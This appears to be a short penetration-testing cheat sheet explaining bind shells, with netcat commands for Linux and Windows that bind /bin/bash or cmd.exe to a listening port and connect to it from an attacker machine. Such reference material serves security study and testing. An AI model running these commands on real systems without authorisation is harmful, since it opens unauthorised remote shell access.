A bind shell is a type of shell where the target machine opens a specific port and binds a command-line interface (CLI) to it. The attacker can connect to this port, gaining access to the shell on the target machine. Unlike reverse shells, bind shells require the attacker to initiate the connection to the target.

## Linux Bind Shell with Netcat

- **Target Machine**
```bash
nc -lvp <bind_port> -e /bin/bash
```

- **Attacker machine**
```bash
nc <target_ip> <bind_port>
```

## Windows Bind Shell with Netcat
It will be necessary transmit the Netcat executable to the Windows machine from the attacker's machine, since Netcat is not preinstalled on Windows.

- **Target Machine**
```bash
nc -lvp <bind_port> -e cmd.exe
```

- **Attacker machine**
```bash
nc <target_ip> <bind_port>
```